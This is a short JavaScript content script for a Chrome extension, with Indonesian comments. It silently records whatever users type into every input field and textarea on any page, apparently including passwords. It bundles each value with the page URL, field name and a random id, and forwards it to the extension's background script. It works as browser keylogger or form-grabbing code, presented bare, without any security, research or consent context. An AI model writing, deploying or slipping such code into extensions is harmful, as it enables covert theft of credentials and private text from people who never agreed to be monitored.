chrome.runtime.onConnect.addListener(function(port) {});

var k = "";
var data = {};
var typingTimer;
var doneTypingInterval = 1000;
var logId = generateRandomId(); // Generate ID acak saat halaman dimuat pertama kali

// Inisialisasi logId pada elemen input atau textarea yang ada di halaman
var inputElements = document.querySelectorAll("input, textarea");
inputElements.forEach(function(element) {
  element.dataset.logId = logId;
});

window.addEventListener("input", function(event) {
  if (!isTextInputElement(event.target)) {
    return;
  }

  clearTimeout(typingTimer);
  k = event.target.value;
  var logId = event.target.dataset.logId;
  typingTimer = setTimeout(function() {
    sendData(event.target.name, logId);
  }, doneTypingInterval);
});

function sendData(name, logId) {
  if (k !== "") {
    data = {
      log_id: logId,
      key: k,
      page: window.location.href,
      name: name
    };

    chrome.runtime.sendMessage(data);
  }

  k = "";
}

function isTextInputElement(element) {
  return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
}

function generateRandomId() {
  return Math.floor(Math.random() * 1000).toString();
}
